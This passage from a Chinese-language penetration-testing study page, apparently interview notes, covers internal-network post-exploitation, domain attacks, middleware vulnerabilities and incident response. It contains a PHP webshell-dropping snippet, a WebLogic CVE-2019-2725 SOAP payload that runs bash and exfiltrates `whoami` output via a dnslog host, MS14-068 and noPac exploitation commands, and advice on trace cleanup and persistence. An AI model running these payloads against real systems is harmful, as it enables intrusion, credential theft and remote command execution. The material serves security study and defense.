<li>首先在已有权限的主机上进行进一步<strong>信息搜集</strong>（系统详细信息，开放端口、服务，补丁信息等），获取有用信息</li>
<li>尝试<strong>提权</strong>，看看是否能够通过更高权限获取更多信息和利用，不能提权无所谓，进行下一步</li>
<li>对已有权限等级做好<strong>权限维持</strong>（免杀，自启动，开机运行，计划任务等等）</li>
<li>尝试通过端口转发、反弹shell、frp代理、Ngrok代理、Earthworm代理、reGeorg代理或其他隧道技术，将内网的流量代理出来，方便<strong>内网环境探测</strong>和<strong>内网横向移动</strong></li>
<li>进行<strong>内网信息搜集</strong>，弄清楚内网有哪些网段，可尝试直接进行内网探测存活主机、端口等，并进一步分析资产漏洞可用性</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#msf模块</span></span><br><span class="line"><span class="comment">#存活主机探测</span></span><br><span class="line">auxiliary/scanner/discovery/udp_sweep    <span class="comment">#基于udp协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/discovery/udp_probe    <span class="comment">#基于udp协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/netbios/nbname         <span class="comment">#基于netbios协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/portscan/tcp           <span class="comment">#基于tcp进行端口扫描(1-10000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#端口扫描</span></span><br><span class="line">auxiliary/scanner/portscan/tcp           <span class="comment">#基于tcp进行端口扫描(1-10000)</span></span><br><span class="line">auxiliary/scanner/portscan/ack           <span class="comment">#基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span></span><br><span class="line"><span class="comment">#端口扫描有时会使会话终端，所以可以上传nmap后在shell中使用nmap扫描。但是要记得清理</span></span><br></pre></td></tr></table></figure>

<ul>
<li>判断<strong>是否存在域环境</strong>，如果存在域环境，尝试搜集域控信息（NetBIOS协议），查看域用户有哪些，方便后续渗透</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all   					查看本机ip，所在域</span><br><span class="line">route <span class="built_in">print</span>    						打印路由信息</span><br><span class="line">net view       						查看局域网内其他主机名</span><br><span class="line">arp -a          					查看arp缓存</span><br><span class="line">net start       					查看开启了哪些服务</span><br><span class="line">net share       					查看开启了哪些共享</span><br><span class="line">net share ipc$  					开启ipc共享</span><br><span class="line">net share c$    					开启c盘共享</span><br><span class="line">net use \\192.168.xx.xx\ipc$ <span class="string">&quot;&quot;</span> /user:<span class="string">&quot;&quot;</span>   			与192.168.xx.xx建立空连接</span><br><span class="line">net use \\192.168.xx.xx\c$ <span class="string">&quot;密码&quot;</span> /user:<span class="string">&quot;用户名&quot;</span>			建立c盘共享</span><br><span class="line"><span class="built_in">dir</span> \\192.168.xx.xx\c$\user    		查看192.168.xx.xx c盘user目录下的文件  </span><br><span class="line">net config Workstation   			查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 			查看本机用户列表</span><br><span class="line">net time /domain        			查看时间服务器，判断主域，主域服务器都做时间服务器</span><br><span class="line">net user /domain         			查看域用户</span><br><span class="line">net localgroup administrators   	查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         			查看有几个域</span><br><span class="line">net user 用户名 /domain   			  获取指定域用户的信息</span><br><span class="line">net group /domain        			查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    		  查看域中某工作组</span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  	查看域管理员的名字</span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  查看域中的其他主机名</span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  查看域控制器（可能有多台）</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试渗透域控或者域成员</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MS14-068</span><br><span class="line">MS17-010永恒之蓝</span><br><span class="line">noPac.exe</span><br><span class="line">域渗透ZeroLogon(CVE-2020-1472)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果域渗透没有进展，可尝试通过其他未入域的存活主机进行渗透</li>
<li>如果拿到相关权限，需进行后渗透操作，清理痕迹、权限维持等</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黄金/白银票据</span><br></pre></td></tr></table></figure>



<h2 id="php-Java反序列化"><a href="#php-Java反序列化" class="headerlink" title="php&#x2F;Java反序列化"></a>php&#x2F;Java反序列化</h2><h2 id="如何绕过cdn"><a href="#如何绕过cdn" class="headerlink" title="如何绕过cdn"></a>如何绕过cdn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1（探测）.多地ping：因为cdn的目的是为了稳定速度，有些cdn服务商可能会在不同的地点或者ip设立节点服务器，所以不同地点ping出的ip不同则采用了cdn；但是多地ping出的ip相同也不一定就是真实ip，还要考虑单一cdn节点的可能性。</span><br><span class="line"></span><br><span class="line">2.二级域名：因为cdn流量还是比较贵的，所以不一定每个子域名都挂上了cdn，此时我们可以通过子域名来发现真实ip本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</span><br><span class="line"></span><br><span class="line">3.国外冷门dns服务器解析：大部分国内cdn服务商只针对国内市场，如果采用外国冷门服务器进行dns解析，有较大概率解析到真实ip</span><br><span class="line"></span><br><span class="line">4.通过网络空间测绘引擎或者情报平台搜索特有http头或者关键字</span><br><span class="line"></span><br><span class="line">5.查询历史dns解析记录，可能以前没有使用cdn，后来再用了cdn解析，如果中途没有换过真实ip，那么有几率获取到真实ip</span><br></pre></td></tr></table></figure>



<h2 id="中间件漏洞-三四个"><a href="#中间件漏洞-三四个" class="headerlink" title="中间件漏洞  三四个"></a>中间件漏洞  三四个</h2><h3 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h3><p>该版本默认将<code>*.asp;.jpg</code>此类格式的文件名，当成asp解析，服务器默认；后面的内容不解析，相当于截断，例如上传asp木马，就可以用<code>xx.asp;.jpg</code>来绕过；iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p>
<p><strong>防御：</strong>禁止上传畸形文件，图片目录设置为禁止脚本执行</p>
<h3 id="iis6-PUT漏洞"><a href="#iis6-PUT漏洞" class="headerlink" title="iis6 PUT漏洞"></a>iis6 PUT漏洞</h3><p>IIS Server在web中开启了webDAV 配置了可以写入的权限，造成了任意文件上传</p>
<p><strong>防御：</strong>关闭webDAV，关闭写入权限</p>
<h3 id="iis7-解析漏洞"><a href="#iis7-解析漏洞" class="headerlink" title="iis7 解析漏洞"></a>iis7 解析漏洞</h3><p>iis7.x版本在Fast-CGI运行模式下，在任意文件，例如：<code>a.jpg/png</code>后面加上<code>/.php</code>,会将<code>.jpg/png</code>解析为php文件</p>
<p><strong>防御：</strong>配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序</p>
<h3 id="Apache未知拓展名解析"><a href="#Apache未知拓展名解析" class="headerlink" title="Apache未知拓展名解析"></a>Apache未知拓展名解析</h3><p>apache默认一个文件可以有多个以点切割的后缀，当最右的后缀无法识别时，就继续向左识别，直到识别到合法后缀才开始解析，如xxx.php.qqq，qqq无法识别，就继续解析，到php时能够识别，就解析为php文件</p>
<h3 id="Apache换行解析漏洞CVE-2017-15715"><a href="#Apache换行解析漏洞CVE-2017-15715" class="headerlink" title="Apache换行解析漏洞CVE-2017-15715"></a>Apache换行解析漏洞CVE-2017-15715</h3><p>2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略</p>
<h3 id="Apache-ssi-远程命令执行漏洞"><a href="#Apache-ssi-远程命令执行漏洞" class="headerlink" title="Apache ssi 远程命令执行漏洞"></a>Apache ssi 远程命令执行漏洞</h3><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 语法执行命令。</p>
<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml</p>
<h3 id="Tomcat弱口令-war远程部署"><a href="#Tomcat弱口令-war远程部署" class="headerlink" title="Tomcat弱口令&amp;war远程部署"></a>Tomcat弱口令&amp;war远程部署</h3><p>Tomcat存在后台管理，账号密码设置在conf&#x2F;tomcat-users.xml</p>
<p>弱口令或爆破(爆破采用数据包base64传递认证)<br>把shell.jsp在本地打包成zip，然后重命名为war，之后上传war，会自动解压，从而getshell</p>
<h3 id="Nginx畸形解析漏洞"><a href="#Nginx畸形解析漏洞" class="headerlink" title="Nginx畸形解析漏洞"></a>Nginx畸形解析漏洞</h3><p>IS 7.0&#x2F;IIS 7.5&#x2F; Nginx &lt;8.03</p>
<p>在默认Fast-CGI开启状况下,上传一个名字为shell.jpg，内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>nginx默认是以CGI的方式支持PHP解析的,普遍的做法是在 Nginx配置文件中</p>
<p>通过正则匹配设置 SCRIPT_FILENAME。</p>
<p>当访可<a target="_blank" rel="noopener" href="http://127.0.0.1/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6">http://127.0.0.1/phpinfo.jpg/1.php这个URL时</a></p>
<p>$fastcgi_script_name会被设置为 “phpinfo.jpg&#x2F;1.php”</p>
<p>SCRIPT_FILENAME传递给 PHP CGI,如果PHP中开启了 fix_pathing这个选项</p>
<p>PHP会认为 SCRIPT_FILENAME是 phpinfo.jpg,而1.php是 PATH_INFO,所以就会将 phpinfo.jpg作为PHP文件来解析</p>
<h3 id="Nginx-fastcgi缓存文件包含"><a href="#Nginx-fastcgi缓存文件包含" class="headerlink" title="Nginx-fastcgi缓存文件包含"></a>Nginx-fastcgi缓存文件包含</h3><p>原理：</p>
<ul>
<li>Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件</li>
<li>通过多重链接绕过 PHP LFI stat 限制完成 LFI</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p>
<h3 id="Weblogic弱口令"><a href="#Weblogic弱口令" class="headerlink" title="Weblogic弱口令"></a>Weblogic弱口令</h3><p>在weblogic搭建好之后没有修改进入后台的密码导致弱口令登录获得webshell<br>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:7001/console">http://127.0.0.1:7001/console</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认账密：weblogic/Oracle@123</span><br></pre></td></tr></table></figure>

<h3 id="Weblogic反序列化CVE-2015-4852、CVE-2016-3510"><a href="#Weblogic反序列化CVE-2015-4852、CVE-2016-3510" class="headerlink" title="Weblogic反序列化CVE-2015-4852、CVE-2016-3510"></a>Weblogic反序列化CVE-2015-4852、CVE-2016-3510</h3><p>危害：远程命令执行</p>
<h3 id="Weblogic-SSRF-CVE-2014-4210"><a href="#Weblogic-SSRF-CVE-2014-4210" class="headerlink" title="Weblogic SSRF CVE-2014-4210"></a>Weblogic SSRF CVE-2014-4210</h3><p>利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>

<h3 id="Weblogic任意文件读取-上传-CVE-2019-2615-2618"><a href="#Weblogic任意文件读取-上传-CVE-2019-2615-2618" class="headerlink" title="Weblogic任意文件读取&#x2F;上传 | CVE-2019-2615&#x2F;2618"></a>Weblogic任意文件读取&#x2F;上传 | CVE-2019-2615&#x2F;2618</h3><p>需要用户名密码认证</p>
<h3 id="Weblogic反序列化远程命令执行CVE-2019-2725"><a href="#Weblogic反序列化远程命令执行CVE-2019-2725" class="headerlink" title="Weblogic反序列化远程命令执行CVE-2019-2725"></a>Weblogic反序列化远程命令执行CVE-2019-2725</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_async/AsyncResponseService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>IP:PORT</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>859</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">SOAPAction</span>:</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping `whoami`.74g4hi.dnslog.cn<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883"><a href="#Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883" class="headerlink" title="Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883"></a>Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883</h3><p>只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类</p>
<ul>
<li>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台</li>
<li>CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令</li>
</ul>
<h3 id="Weblogic后台war后门文件部署"><a href="#Weblogic后台war后门文件部署" class="headerlink" title="Weblogic后台war后门文件部署"></a>Weblogic后台war后门文件部署</h3><h2 id="打域控的方法"><a href="#打域控的方法" class="headerlink" title="打域控的方法"></a>打域控的方法</h2><h3 id="MS14-068-Kerberos域用户提权漏洞"><a href="#MS14-068-Kerberos域用户提权漏洞" class="headerlink" title="MS14-068 Kerberos域用户提权漏洞"></a>MS14-068 Kerberos域用户提权漏洞</h3><p>前提：</p>
<ol>
<li>域账户</li>
<li>域账户密码</li>
<li>SID</li>
<li>域控IP</li>
</ol>
<p>MS14-068是内网横向PTT攻击的一种</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u test02@hack.lab -s S-1-5-21-3725850554-4274512539-2478289712-1112 -d 192.168.1.1 -p Test03!@<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<h3 id="域渗透Zerologon-Netlogon-CVE-2020-1472"><a href="#域渗透Zerologon-Netlogon-CVE-2020-1472" class="headerlink" title="域渗透Zerologon&#x2F;Netlogon CVE-2020-1472"></a>域渗透Zerologon&#x2F;Netlogon CVE-2020-1472</h3><p>影响MS-NRPC所使用的加密身份验证方案（AES-CFB8）</p>
<blockquote>
<p>AES-CFB8的工作原理是，通过在明文前面添加一个16字节的初始化矢量（IV），然后将AES应用于IV和明文的前16个字节，并采用AES输出的第一个字节，来加密明文的每个字节，然后将其与下一个纯文本字节进行异或</p>
<p>对于256个密钥中的1个，对全零的纯文本应用AESCFB8加密将导致全零的密文，从而启用登录绕过，这就是名称zerologon的来源</p>
</blockquote>
<h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><p>条件：139、445端口开放</p>
<h3 id="nopac-CVE-2021-42278-42287"><a href="#nopac-CVE-2021-42278-42287" class="headerlink" title="nopac  CVE-2021-42278&#x2F;42287"></a>nopac  CVE-2021-42278&#x2F;42287</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#检测</span></span><br><span class="line">./noPac.exe scan -domain test1.local -user kk -pass 123Q</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞利用</span></span><br><span class="line">./noPac.exe -domain test1.local -user kk -pass <span class="string">&quot;123QWE..&quot;</span> /dc dc.test1.local /mAccount demo123 /mPassword Password123！/service cifs /ptt</span><br></pre></td></tr></table></figure>



<h3 id="pth-ptk-ptt"><a href="#pth-ptk-ptt" class="headerlink" title="pth&#x2F;ptk&#x2F;ptt"></a>pth&#x2F;ptk&#x2F;ptt</h3><h3 id="smb中继"><a href="#smb中继" class="headerlink" title="smb中继"></a>smb中继</h3><h3 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm relay"></a>ntlm relay</h3><p>NTLM hash 分为 NTLMv1 NTLMv2 NTLM session v2 三种，NTLMv2 的强度比 NTLMv1 强了不少 ，我们在实战中，如果获得的是NTLMv1的话直接对其进行爆破就行了，而现实情况中我们遇到的是 NTLMv2，NTLMv2的密码强度高了不少，因此如果你没有一个超级强大的字典，你很难得到明文密码，将截获的Net-NTLM Hash重放来进行攻击，从而实现对其他机器的控制</p>
<p>为了重放这个Net-NTLMhash，首先我们要做的就是获取这个Net-NTLMhash。</p>
<p>由于SMB、HTTP、LDAP、MSSQL等协议都可以携带NTLM认证的三类消息，所以只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试向攻击者发送Net-NTLMhash从而让攻击者截获用户的Net-NTLMhash，也就是说我们可以通过这些协议来进行攻击</p>
<h3 id="adcs域内提权CVE-2022-26923"><a href="#adcs域内提权CVE-2022-26923" class="headerlink" title="adcs域内提权CVE-2022-26923"></a>adcs域内提权CVE-2022-26923</h3><h3 id="域管token横向"><a href="#域管token横向" class="headerlink" title="域管token横向"></a>域管token横向</h3><p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。<br>令牌(token)可以假冒，当我们需要域管理员操作权限时，就可以通过假冒域管理员的令牌进行攻击：<br>这里我们主要说访问令牌(Access Token),在windows中Access Token分为两种：授权令牌(Delegation Token)和模拟令牌(Impresonation Token) ；它们之前的区别就在于前者属于交互式会话登陆，而后者属于非交互的会话，两种Token在系统重启后会清除，但前者的Token用户在注销后，会变成后者。</p>
<p>此方法需要administrator管理员权限，当我们如果只是一个webshell或者user组权限时，是需要先进行提权操作。</p>
<p><strong>token窃取方法</strong></p>
<ol>
<li>incognito.exe：适用于有杀软，不出网，防火墙限制，cs&#x2F;msf无法上线的情况</li>
<li>msf的incognito模块：适用于meterpreter上线后的机器</li>
<li>cs窃取token：steal_token，cs上线后可用</li>
</ol>
<h3 id="打域控开放的服务"><a href="#打域控开放的服务" class="headerlink" title="打域控开放的服务"></a>打域控开放的服务</h3><h3 id="dcom-wmi"><a href="#dcom-wmi" class="headerlink" title="dcom wmi"></a>dcom wmi</h3><h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><h3 id="spn漏洞"><a href="#spn漏洞" class="headerlink" title="spn漏洞"></a>spn漏洞</h3><h3 id="CVE-2022-26809"><a href="#CVE-2022-26809" class="headerlink" title="CVE-2022-26809"></a>CVE-2022-26809</h3><h3 id="CVE-2021-1732"><a href="#CVE-2021-1732" class="headerlink" title="CVE-2021-1732"></a>CVE-2021-1732</h3><h2 id="编写exp相关经历"><a href="#编写exp相关经历" class="headerlink" title="编写exp相关经历"></a>编写exp相关经历</h2><ul>
<li></li>
</ul>
<h2 id="windows和linux的应急响应"><a href="#windows和linux的应急响应" class="headerlink" title="windows和linux的应急响应"></a>windows和linux的应急响应</h2><h3 id="研判"><a href="#研判" class="headerlink" title="研判"></a>研判</h3><h4 id="正在被入侵"><a href="#正在被入侵" class="headerlink" title="正在被入侵"></a>正在被入侵</h4><p>若发现攻击者正在进行入侵（web漏洞扫描，弱口令爆破等）：一般情况下都会产生日志，尽量采用远程日志系统（rsylog等），远程日志可以防止黑客删除日志；溯源找到攻击者的源IP，并在防火墙等位置做出相应处置（封堵等）</p>
<h4 id="目的未达成"><a href="#目的未达成" class="headerlink" title="目的未达成"></a>目的未达成</h4><p>若发现攻击者已成功上传木马、后门等，流量数据正在回传的情况：建立内存备份（快照，dump内存等），方便后续进行取证；进行内存取证&#x2F;快照分析，定位到相应的木马文件（webshell，shellcode等）和攻击者利用的漏洞点，进行相关处理（删除或修复），防止二次入侵；根据攻击者的流量分析出攻击者的意图（攻击者想要干什么）；确定攻击者的ip，在防火墙等位置进行相关处理；选择性重启服务器进入安全模式，对相应后门进行排查和删除</p>
<h4 id="目的已达成"><a href="#目的已达成" class="headerlink" title="目的已达成"></a>目的已达成</h4><p>若发现攻击者已经达成目的，删除了相关木马文件和日志：首先定位被入侵的时间点，方便后续针对该时间点进行分析；建立内存备份（快照，dump内存等），方便后续进行取证；定位到被入侵的时间点，查找攻击者的攻击流量并分析，找到相关的木马或后门信息（链接，文件名等）以及利用的漏洞点，确定攻击者的ip；查找系统内对应时间点相关的日志，分析找到相关线索；如果日志被删除，尝试通过硬盘数据备份进行数据恢复</p>
<h3 id="判断误报"><a href="#判断误报" class="headerlink" title="判断误报"></a>判断误报</h3><p>首先分析相关数据包的内容是否为攻击流量（后门，webshell等）；分析报的ip相关的历史流量，是否有过攻击行为；如果没有则可能是误报，不处理（可以误报，但不能漏报）</p>
<h3 id="挖矿病毒排查"><a href="#挖矿病毒排查" class="headerlink" title="挖矿病毒排查"></a>挖矿病毒排查</h3><h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><ul>
<li>因为挖矿病毒的目的性，决定了挖矿病毒要占用很高的CPU或GPU性能，首先任务管理器结束掉占用高的进程，记录进程名和位置</li>
<li>挖矿病毒需要联网，使用<code>netstat -ano | findstr ESTABLISHED</code> 排查是否存在恶意网络连接</li>
<li>查找有无新增用户<code>net user</code>，查看计划任务是否存在异常</li>
<li>删除相关异常文件，观察是否还存在内存占用高的情况</li>
</ul>
